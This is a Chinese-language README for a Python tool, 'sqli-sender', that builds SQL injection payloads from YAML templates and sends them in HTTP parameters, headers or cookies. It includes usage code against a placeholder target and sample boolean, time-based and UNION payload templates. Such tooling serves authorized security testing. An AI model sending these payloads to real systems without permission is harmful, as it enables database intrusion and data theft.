# sqli-sender

SQL 注入场景化载荷发送工具 — 专注于根据不同注入场景构造并发送 HTTP 请求，**不包含漏洞判定逻辑**。

## 特性

- **多注入位置**：支持在 GET/POST 参数、Headers、Cookies 中注入 payload
- **多注入方式**：报错型、布尔盲注、时间盲注、联合查询
- **YAML 模板管理**：使用 YAML 文件管理载荷模板，支持多种数据库类型
- **占位符系统**：使用 `{{PAYLOAD}}` 占位符灵活指定注入位置
- **松耦合设计**：载荷构造与请求发送分离，便于扩展
- **轻量依赖**：仅依赖 `requests` 和 `PyYAML`

## 安装

```bash
pip install -r requirements.txt
```

## 快速使用

### PayloadProcessor — 载荷构造

```python
from sqli_sender import PayloadProcessor

processor = PayloadProcessor()
processor.load_from_file("sqli_sender/payloads/default.yaml")

# 生成 MySQL 布尔盲注 payload
payloads = processor.get_payloads(
    "mysql", "boolean_based", boolean_condition="1=1"
)
# ['AND 1=1-- ', 'OR 1=1-- ', ...]
```

### InjectionSender — 请求发送

```python
from sqli_sender import InjectionSender

sender = InjectionSender(
    url="http://target.com/page.php",
    method="GET",
    params={"id": "1{{PAYLOAD}}"},
    injection_point="param",
    injection_type="boolean",
)

# 发送 payload
response = sender.send(" AND 1=1-- ")
print(response.status_code)
print(response.text)
```

## 项目结构

```
sqli_sender/
├── __init__.py          # 包入口
├── exceptions.py        # 自定义异常
├── payload.py           # PayloadProcessor 载荷构造器
├── sender.py            # InjectionSender 请求发送器
├── utils.py             # 工具函数
└── payloads/
    └── default.yaml     # 默认载荷模板
```

## 自定义载荷模板

创建自己的 YAML 模板文件：

```yaml
databases:
  mysql:
    comment: "-- "
    boolean_based:
      - "AND {BOOLEAN_CONDITION}"
      - "OR {BOOLEAN_CONDITION}"
```

支持的占位符：

| 占位符 | 说明 | 示例值 |
|--------|------|--------|
| `{QUERY}` | SQL 子查询 | `SELECT user()` |
| `{BOOLEAN_CONDITION}` | 布尔条件 | `1=1` |
| `{SLEEP_TIME}` | 延时秒数 | `5` |
| `{COLUMNS}` | UNION 列定义 | `1,2,3` |

## 开发

```bash
# 安装测试依赖
pip install pytest pytest-cov

# 运行测试
pytest tests/ -v

# 带覆盖率
pytest tests/ --cov=sqli_sender -v
```

## 许可证

MIT
